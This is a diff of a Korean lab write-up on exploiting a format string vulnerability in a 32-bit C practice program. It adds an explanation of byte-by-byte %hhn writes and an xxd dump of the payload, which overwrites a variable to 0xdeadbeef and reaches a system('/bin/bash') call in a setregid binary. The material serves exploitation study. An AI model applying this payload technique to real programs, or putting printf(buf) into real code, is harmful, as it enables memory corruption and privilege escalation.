@@ -138,18 +138,19 @@ offset = 6
 ### 실습 환경
 
 ```c
-    int target = 0xcafebabe;
-    char buf[100];
+int target = 0xcafebabe;
+char buf[100];
 
-    printf("target addr = %p\n", &target);
-    fgets(buf, sizeof(buf), stdin);
-    printf(buf); //포맷 스트링 취약점
-    printf("\ntarget = 0x%x\n", target);
+printf("target addr = %p\n", &target);
+fgets(buf, sizeof(buf), stdin);
+printf(buf); //포맷 스트링 취약점
+printf("\ntarget = 0x%x\n", target);
 
-    if(target == 0xdeadbeef){
+if(target == 0xdeadbeef){
 	printf("good!\n");
-        system("/bin/bash");
-    }
+    system("/bin/bash");
+	//디렉터리 내 vuln.c에는 setregid() 추가함
+}
 ```
 
 * 32bit
@@ -236,6 +237,30 @@ ef be ad de
 * `%hhn` : 출력된 바이트 수의 **하위 1바이트**를 기록
 * pad는 **누적 출력 카운트 기준으로 계산**
 
+다음과 같이 입력하는 게 목.
+```
+[&t+3] 0xde
+[&t+2] 0xea
+[&t+1] 0xbe
+[ &t ] 0xef
+(target)
+```
+
+printf는 buf에 저장된 값을 포맷 스트링으로 처리하게 된다.
+그러다 형식 지정자를 만나면 형식 지정자에서 지정한 위치를 인자인 것처럼 읽는다.
+
+```
++--------------+
+│      buf     │ → print의 인자인 것처럼 사용
++--------------+
+│     ...      │   offset만큼 떨어져있음
++--------------+
+│   fmt(&buf)  │ → buf에 저장된 값을 포맷 문자열처럼 읽음
++--------------+
+```
+printf는 fmt 이후의 값을 가변 인자로 가정하고 순차적으로 읽기 때문에,
+buf에 저장된 주소 값들이 인자로 착각되어 사용된다.
+
 
 ### 4.4 payload 생성 코드
 
@@ -264,6 +289,17 @@ payload += b"\n"
 sys.stdout.buffer.write(payload)
 ```
 
+생성된 페이로드는 다음과 같이 확인 가능하다.
+
+```
+$ xxd /tmp/payload
+00000000: 2ccf ffff 2dcf ffff 2ecf ffff 2fcf ffff  ,...-......./...	#target 주소
+00000010: 2531 2432 3233 6325 3624 6868 6e25 3124  %1$223c%6$hhn%1$	#형식 인자 역할
+00000020: 3230 3763 2537 2468 686e 2531 2432 3339  207c%7$hhn%1$239
+00000030: 6325 3824 6868 6e25 3124 3439 6325 3924  c%8$hhn%1$49c%9$
+00000040: 6868 6e0a
+```
+
 > **노트 — `struct.pack()`이란?**
 >
 > `struct.pack()`은 파이썬의 정수 값을  
@@ -288,10 +324,7 @@ sys.stdout.buffer.write(payload)
 
 ### 4.5 결과
 
-```
-target = 0xdeadbeef
-good!
-```
+![결과](/images/format-string-vuln/01.png)
 
 - `%hhn`을 이용해 1바이트씩 조립
 - 입력 길이가 길어 출력이 매우 지저분해지지만 정상 동작
@@ -302,4 +335,3 @@ good!
 > * `buf` 크기가 작으면 `fgets`에 의해 **포맷 문자열이 중간에서 잘림**
 > * 이는 오버플로우가 아니라 **입력 길이 제한 + NULL 종료** 때문
 > * 처음 buf의 크기를 40으로 두었다가 fgets에 의해 포맷 문자열이 잘려 익스플로잇 실패.
-
